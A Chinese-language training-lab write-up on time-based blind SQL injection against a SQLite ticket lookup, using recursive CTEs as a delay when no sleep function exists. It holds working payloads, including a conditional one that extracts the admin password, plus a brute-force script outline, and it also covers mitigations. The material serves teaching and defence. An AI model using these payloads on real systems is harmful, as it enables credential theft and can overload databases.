# 工单查询处的盲注（数据库没有 SLEEP）

## 这一题在教什么

**延迟不一定要来自"睡"，也可以来自"算"。**

这一题跟 `sqli/time_blind` 是一对，区别只有一个，但很关键：

| | `time_blind` | 这一题 |
|---|---|---|
| 延迟从哪来 | 服务端**额外注册**了一个 `sleep()` 函数 | **没有** —— 得自己造 |
| payload | 跟 MySQL 上写的一样 | 得用这个数据库能做的"重计算" |

真实的数据库千奇百怪，`sleep` 这条路经常断：

| 数据库 | 延迟怎么写 |
|---|---|
| MySQL | `SLEEP(5)` —— 有函数 |
| PostgreSQL | `pg_sleep(5)` —— 有函数 |
| SQL Server | `WAITFOR DELAY '0:0:5'` —— **不是函数**，是独立语法 |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('a', 5)` —— 靠收一个包 |
| **SQLite** | **没有** |
| 托管数据库 | 有些**主动禁掉**了 sleep 类函数 |
| 有语句超时的平台 | sleep 长一点就被掐 |

所以"**怎么让这条语句慢下来**"是一个通用问题 —— 答案随环境变。

## 漏洞在哪

页面永远说同一句话（连报错都不给），唯一的信号是响应时间：

```python
sql = "SELECT subject FROM tickets WHERE ticket_no = '%s'" % ticket_no
```

跟 `time_blind` 一样。区别在于**这一题没有给 `sleep()`**。

## 怎么打通

### 第一步：确认只剩时间

查一个存在的工单号和不存在的一个 —— 返回的 HTML 一模一样。

### 第二步：造一个延迟

想想"慢"还能从哪来：

| 手段 | SQLite 里对应什么 |
|---|---|
| 算很多次（循环） | **递归 CTE** |
| 分配很大一块内存 | `randomblob(N)` |
| 做很多次 IO | 大表的 `COUNT(*)` |

**递归 CTE 就是一个可以控制的循环：**

```
' OR (SELECT count(*) FROM (
         WITH RECURSIVE c(x) AS (
             SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x < 4000000
         ) SELECT x FROM c)) -- 
```

400 万次 ≈ 0.5 秒；600 万次 ≈ 0.7 秒。想要几秒就把那个数字往上调。

### 第三步：变成条件式的

跟 `time_blind` 那道题同一个形状：

```
' OR CASE WHEN (
         (SELECT substr(password,1,1) FROM users WHERE username='admin')='q'
     ) THEN (
         SELECT count(*) FROM (
             WITH RECURSIVE c(x) AS (
                 SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x < 6000000
             ) SELECT x FROM c)
     ) ELSE 0 END -- 
```

- 慢 → 猜对了
- 快 → 猜错了

### 第四步：写脚本

```
for pos in 1..6:
    for ch in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = 上面那个（换 %d 和 %s）
        发请求，量耗时
        if 耗时 > 1 秒:
            记下 ch; break
```

### 第五步：提交密码

## 选哪种原语（这一节是这一题的核心）

实测数据（同一台机器）：

| 原语 | 耗时 | 峰值内存 |
|---|---|---|
| 递归 CTE 600 万次 | 0.70 秒 | **12.6 MB**（基线 12.4，几乎不涨） |
| `randomblob(200MB)` | 0.92 秒 | **394 MB**（涨了 380 MB） |

**两者耗时差不多，但一个吃 CPU、一个吃内存。**

选原语的标准：

> **耗时可控、内存和 IO 稳定、重复调用不会把服务打坏。**

- 递归 CTE：三条都满足 → **首选**
- `randomblob(N)`：换来同样的时间要多花几十倍内存；跑几次就能把进程打死。
  而且内存分配的时间**不稳定**（受内存碎片、GC 影响）—— 当信道用很糟
- 笛卡尔积自连接：吃 CPU，但行数不好精确控制
- `LIKE`/正则的回溯：在 SQLite 上实测**几乎不耗时**（它的 `LIKE` 是线性的），
  在别的数据库上可能是灾难性的 —— **所以"哪种原语有效"本身要先测**

### 一个反直觉的点

**"用 sleep"和"用重计算"在语义上是一回事。**

`sleep(3)` 做的事是"消耗 3 秒的某一种资源"。递归 CTE 做的事是
"消耗相当于 3 秒的 CPU"。对一个**盲注信道**来说，两者完全等价 ——
它要的只是"条件为真时这次请求慢"。

所以当 sleep 不可用时，问题不是"没有延迟了"，而是
"**换一种资源来消耗**"。

## 靶场的上限（值得说明）

靶场给单条语句加了 **20 秒**的上限。这不是修复 —— 是为了不让一个请求
把 worker 占住几分钟：递归 CTE 的迭代次数是由 payload 决定的。

真实目标**没有**这个保护。所以现实里要小心：

> 一条构造不当的 payload 可能直接把数据库拖垮。造延迟的时候
> **先用小数字校准**，确认量级之后再往上调。

（这一条也是"造延迟"这类手法的通用注意事项：你在给目标加压，
而你不知道它有多脆弱。）

## 怎么修

**一、参数化。** 跟前几道一样：

```python
con.execute("SELECT subject FROM tickets WHERE ticket_no = ?", (ticket_no,))
```

**二、但这一题更值得说"缓解"这件事。**

时间盲注的原理是"输入能影响执行时间"。参数化之后就无从影响了。
如果出于某种原因必须拼（比如标识符位置），那还有几层：

| 措施 | 效果 | 局限 |
|---|---|---|
| **给语句设超时** | 单条语句跑太久就掐掉 | 会留下"超时与否"这个**新信号** —— 是缓解不是修复 |
| 限制查库账号权限 | 读不到 `users` 就没得猜 | 需要把权限设计对 |
| 限流 | 盲注要发成百上千个请求，成本抬高 | 限流本身能被绕过 |
| 监控 | "同一接口短时间大量带引号的输入"应该报警 | 需要能区分正常业务 |

**注意第一条的局限**：这一题靶场自己就加了一个 20 秒上限，
而页面上会显示「语句跑到了上限被中止」—— **那本身就是一条泄露**。
真实系统里如果超时返回 500、正常返回 200，你就多了一个更省事的信道。

> **任何"因为数据而变的可观测行为"都是信道。**
> 时间、状态码、响应头、响应大小、超时与否……
